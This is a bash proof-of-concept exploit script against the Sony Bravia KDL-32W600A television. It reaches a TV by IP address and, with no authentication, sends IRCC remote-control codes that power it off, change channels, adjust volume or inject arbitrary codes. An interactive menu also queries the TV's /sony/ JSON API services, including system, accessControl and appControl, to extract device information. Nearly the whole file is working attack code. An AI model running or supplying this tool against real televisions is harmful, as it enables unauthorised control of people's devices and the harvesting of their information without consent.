#!/bin/bash

function usage(){
	printf -- "Usage bash tv_Sony_Bravia_KDL-32W600A_remote_controller_exploit_poc.sh <tv-ip-address>\n"
}

function check_if_host_is_up(){

	host="$1"
	###################
	# common tv ports #
	###################
	port="80"
	#port="52323"
	timeout="2"

	if [ -z "$1" ]
	then
		usage
		exit
	fi

	printf "Checking connectivity with Sony Bravia Tv in $host $port\n"
	timeout "$timeout" bash -c "echo >/dev/tcp/$host/$port" &&
	printf "\nTV is \e[0;32monline\e[0m\n\n" ||
	printf "\nTV is \e[0;31moffline\e[0m\n\n"

}

function tvdraw(){
        printf -- " -. --.-~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
        printf -- " x x        \    /~~~~~~~~~~~~~~\n"
        printf -- "             \  /  ~~~~~~~~~~~~\n"
        printf -- "              \/    ~~~~~~~~~~\n"
        printf -- "    .===============.~~~~~~~~ \n"
        printf -- "    | .-----------. | ~~~~~~\n"
        printf -- "    | |           | |  ~~~~\n"
        printf -- "    | |    ***    | |   ~~ \n"
        printf -- "    | |   P W N   | |   __\n"
        printf -- "    | '-----------'o|  |o.|\n"
        printf -- "    |===============|  |::|\n"
        printf -- "    |# SONY BRAVIA #|  |::|\n"
        printf -- "    '==============='  '--'\n"
        printf -- "    REMOTE API CONTROL \n\n"
}


function panel(){
	while [ 0 -eq 0 ]
	do
		tvdraw
		printf -- "[X] Shutdown TV\n\n[1] Channels     [2] VOL\n[3] Send code    [4] EXTRACT INFO\n\n"
		read -p "Select: " panel_options

		if [ "$panel_options" == "exit" ]
		then
			exit
		fi

		if [ "$panel_options" == "1" ] || [ "$panel_options" == "channels" ] || [ "$panel_options" == "Channels" ] || [ "$panel_options" == "CHANNELS" ]
		then
        		DIAL
		fi

		if [ "$panel_options" == "2" ] || [ "$panel_options" == "vol" ] || [ "$panel_options" == "Vol" ] || [ "$panel_options" == "VOL" ]
		then
        		VOL
		fi


		if [ "$panel_options" == "4" ] || [ "$panel_options" == "info" ] || [ "$panel_options" == "INFO" ] || [ "$panel_options" == "extract info" ] || [ "$panel_options" == "Extract info" ] || [ "$panel_options" == "EXTRACT INFO" ]
                then
                        EXTRACT_INFO
                fi



		if [ "$panel_options" == "X" ] || [ "$panel_options" == "poweroff" ] || [ "$panel_options" == "Poweroff" ] || [ "$panel_options" == "POWEROFF" ]
		then
			printf -- "Shutting down tv\n"
        		curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAvAw==</IRCCCode>' $ip$url
		fi

		if [ "$panel_options" == "3" ] || [ "$panel_options" == "send code" ]
		then
			while [ 0 -eq 0 ]
			do
				read -p "Enter code value here: " CODE
				if [ "$CODE" == "exit" ]
				then
					panel
				fi
				curl -X POST -d '<IRCCCode>"$CODE"</IRCCCode>' $ip$url
			done
		fi

	done
}


function DIAL(){
	while [ 0 -eq 0 ]
	do
		read -p "Enter Channel: " dial

		if [ $dial == "exit" ]
		then
			panel
		fi


		if [ $dial -eq 1 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAAAw==</IRCCCode>' $ip$url
		fi

		if [ $dial -eq 2 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAABAw==</IRCCCode>' $ip$url
		fi


		if [ $dial -eq 3 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAACAw==</IRCCCode>' $ip$url
		fi

		if [ $dial -eq 4 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAADAw==</IRCCCode>' $ip$url
		fi

		if [ $dial -eq 5 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAEAw==</IRCCCode>' $ip$url
		fi

		if [ $dial -eq 6 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAFAw==</IRCCCode>' $ip$url
		fi

		if [ $dial -eq 7 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAGAw==</IRCCCode>' $ip$url
		fi

		if [ $dial -eq 8 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAHAw==</IRCCCode>' $ip$url
		fi

		if [ $dial -eq 9 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAIAw==</IRCCCode>' $ip$url
		fi

		if [ $dial -eq 0 ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAJAw==</IRCCCode>' $ip$url
		fi
	done
}

function VOL(){
	printf -- "press + to turn up     press - to turn down    press mute to silence\n"
	while [ 0 -eq 0 ]
	do
		read -p "Select volumen: " vol

		if [ "$vol" == "exit" ]
		then
			panel
		fi

		if [ "$vol" == "+" ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAASAw==</IRCCCode>' $ip$url
		fi

		if [ "$vol" == "-" ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAATAw==</IRCCCode>' $ip$url
		fi

		if [ "$vol" == "mute" ]
		then
			curl -X POST -d '<IRCCCode>AAAAAQAAAAEAAAAUAw==</IRCCCode>' $ip$url
		fi

	done
}


function EXTRACT_INFO(){
ip="$ip/sony/"
scalar_api=(guide system videoScreen audio avContent recording appControl browser notification cec accessControl irCommandProxy)

	while [ 0 -eq 0 ]
	do
		printf -- "${scalar_api[*]} \n"


		read -e -p "Enter: " scalar_select

		if [ "$scalar_select" == "exit" ]
		then
			panel
		fi

		if [ "$scalar_select" == "guide" ] 
		then
			printf -- "$ip${scalar_api[0]}\n"

			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi
				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[0]}"
				echo -e "\n"
			done

		fi

		if [ "$scalar_select" == "system" ] 
		then
			printf -- "$ip${scalar_api[1]}\n"

			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi
				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[1]}" 
				echo -e "\n"
			done


		fi

		if [ "$scalar_select" == "videoScreen" ] 
		then
			printf -- "$ip${scalar_api[2]}\n"

			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi

				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[2]}"
				echo -e "\n"
			done


		fi

		if [ "$scalar_select" == "audio" ] 
		then
			printf -- "$ip${scalar_api[3]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"

			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi

				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[3]}"
				echo -e "\n"
			done
		fi

		if [ "$scalar_select" == "avContent" ] 
		then
			printf -- "$ip${scalar_api[4]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi

				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[4]}"
				echo -e "\n"
			done
		fi

		if [ "$scalar_select" == "recording" ] 
		then
			printf -- "$ip${scalar_api[5]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi

				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[5]}"
				echo -e "\n"
			done
		fi

		if [ "$scalar_select" == "appControl" ] 
		then
			printf -- "$ip${scalar_api[6]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi


				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[6]}"
				echo -e "\n"
			done
		fi

		if [ "$scalar_select" == "browser" ] 
		then
			printf -- "$ip${scalar_api[7]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi

				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[7]}"
				echo -e "\n"
			done
		fi

		if [ "$scalar_select" == "notification" ] 
		then
			printf -- "$ip${scalar_api[8]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi


				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[8]}"
				echo -e "\n"
			done
		fi

		if [ "$scalar_select" == "cec" ] 
		then
			printf -- "$ip${scalar_api[9]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi


				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[9]}"
				echo -e "\n"
			done
		fi

		if [ "$scalar_select" == "accessControl" ] 
		then
			printf -- "$ip${scalar_api[10]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi

				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[10]}"
				echo -e "\n"
			done
		fi

		if [ "$scalar_select" == "irCommandProxy" ] 
		then
			printf -- "$ip${scalar_api[11]}\n"
			printf -- "example    getMethodTypes    or getPowerStatus in system \n"
			while [ 0 -eq 0 ]
			do
				read -p "Enter Method: " metuko
				if [ "$metuko" == "exit" ]
				then
					EXTRACT_INFO
				fi


				echo -e "\n"
				curl -X POST -d '{"id": 20, "method": "'$metuko'", "version": "1.0", "params": [""]}' "$ip${scalar_api[11]}"
				echo -e "\n"
			done
		fi

	done
}



ip="$1"
url="/sony/IRCC"

check_if_host_is_up "$1"
panel
